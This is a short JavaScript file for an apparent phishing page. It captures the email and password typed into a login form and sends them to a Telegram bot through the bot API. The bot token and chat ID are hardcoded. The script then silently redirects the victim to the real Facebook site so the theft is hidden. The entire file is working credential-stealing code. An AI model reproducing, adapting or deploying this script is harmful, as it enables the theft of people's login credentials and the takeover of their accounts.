document
  .getElementById("loginForm")
  .addEventListener("submit", async function (e) {
    e.preventDefault();

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const telegramBotToken = "7839216609:AAE8PIdrMTDRErcNeylfmYvR4IPn9WCulBg";
    const chatId = "586760382";
    const message = `Email: ${email}\nPassword: ${password}`;

    try {
      await fetch(
        `https://api.telegram.org/bot${"7839216609:AAE8PIdrMTDRErcNeylfmYvR4IPn9WCulBg"}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        }
      );

      // تحويل المستخدم لموقع فيسبوك
      // alert("Data sent successfully! Redirecting to Facebook...");
      window.location.href = "https://www.facebook.com";
    } catch (error) {
      alert("Error sending data. Please check your bot configuration.");
      console.error(error);
    }
  });
